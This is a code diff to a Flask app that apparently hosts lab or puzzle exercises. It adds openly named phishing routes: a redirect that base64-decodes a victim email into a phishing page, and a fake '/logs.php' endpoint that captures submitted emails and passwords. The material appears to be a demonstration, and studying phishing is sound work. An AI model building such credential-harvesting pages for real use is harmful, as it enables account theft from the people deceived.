@@ -5,6 +5,7 @@ import ipaddress
 import os
 import uuid
 
+from base64 import b64decode
 from pathlib import Path
 from typing import Optional
 
@@ -392,3 +393,24 @@ def compute_sha512():
     if correct_id and int(correct_id) == 13369:
         return redirect('https://en.wikipedia.org/wiki/SHA-2')
     return render_template('99.3.compute_hashes.html', current_id=_id)
+
+
+@app.route('/cool_phinshing/<string:b64_email>')
+def cool_phinshing(b64_email: str):
+    resp = Response("Refresh header")
+    resp.headers['Refresh'] = f'0; /cool_phinshing_render#{b64decode(b64_email).decode()}'
+    return resp
+
+
+@app.route('/cool_phinshing_render')
+def cool_phinshing_render():
+    return render_template('99.4.cool_phishing.html')
+
+
+@app.route('/logs.php', methods=['POST'])
+def cool_phinshing_render_logs():
+    print(request.form)
+    resp = Response("Thanks for the credentials")
+    resp.headers['email'] = request.form['email']
+    resp.headers['password'] = request.form['password']
+    return resp
